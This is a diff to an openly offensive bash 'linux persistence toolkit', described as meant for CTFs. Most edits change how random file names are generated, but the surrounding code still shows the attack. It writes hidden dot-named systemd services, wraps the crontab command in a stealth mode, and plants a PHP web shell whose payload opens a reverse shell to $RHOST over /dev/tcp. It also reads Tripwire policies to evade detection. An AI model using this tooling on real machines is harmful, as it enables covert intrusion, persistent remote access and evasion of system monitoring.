@@ -18,23 +18,22 @@ else
 fi
 
 CRON="* * * * *"
-RANDOMPHPFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
+RANDOMPHPFILE=$(echo $(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').php)
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
-SERVICEFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
-SERVICESHELLSCRIPT=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').sh)
-
-TMPCLEANBASHRC=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPCLEANRCLOCAL=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPCRON=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPCRONWITHPAYLOAD=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPEASYINSTALLDIR=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPJJSFILE=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPPASSWORDFILE=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPPIPDIR=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPPIP3DIR=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPRCLOCAL=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
-TMPWEB=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
+SERVICEFILE=$(echo $(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').service)
+SERVICESHELLSCRIPT=$(echo $(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').sh)
+TMPCLEANBASHRC=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPCLEANRCLOCAL=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPCRON=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPCRONWITHPAYLOAD=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPEASYINSTALLDIR=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPJJSFILE=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPPASSWORDFILE=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPPIPDIR=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPPIP3DIR=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPRCLOCAL=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPWEB=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
 
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
@@ -165,8 +164,8 @@ limit_checker(){
 stealth_modifications(){
 
     DISABLEBASHRC=1
-    SERVICEFILE=$(echo /etc/systemd/system/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
-    SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
+    SERVICEFILE=$(echo /etc/systemd/system/.$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').service)
+    SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
 
     echo 'function crontab () {
     REALBIN="$(which crontab)"
@@ -301,11 +300,11 @@ webserver_poison_attack() {
 			if $(echo $METHOD | grep -qi "php");
 			then	
 			    unset IFS
-			    RANDOMPHPFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
+			    RANDOMPHPFILE=$(echo $(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').php)
 
 			    if [ "$STEALTHMODE" -eq 1 ];
 			    then
-				RANDOMPHPFILE=$(echo .$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
+				RANDOMPHPFILE=$(echo .$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').php)
 			    fi
 
 			    PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
@@ -449,7 +448,7 @@ cleanup() {
 enum_defenses() {
 
     echo -e "\e[92m[+]\e[0m Enumerating Tripwire Policies"
-    file /etc/tripwire/* | grep "ASCII" | awk -F: '{print $1}' | xargs cat | grep --color=always -e ^SEC -e systemd -e crontab -e bashrc -e rc\.local -e /etc/skel
+    file /etc/tripwire/* | grep "ASCII" | awk -F: '{print $1}' | xargs cat | grep --color=always -e ^SEC -e systemd -e crontab -e bashrc -e rc\.local -e /etc/skel || echo "[+] None Found"
 
 }
 
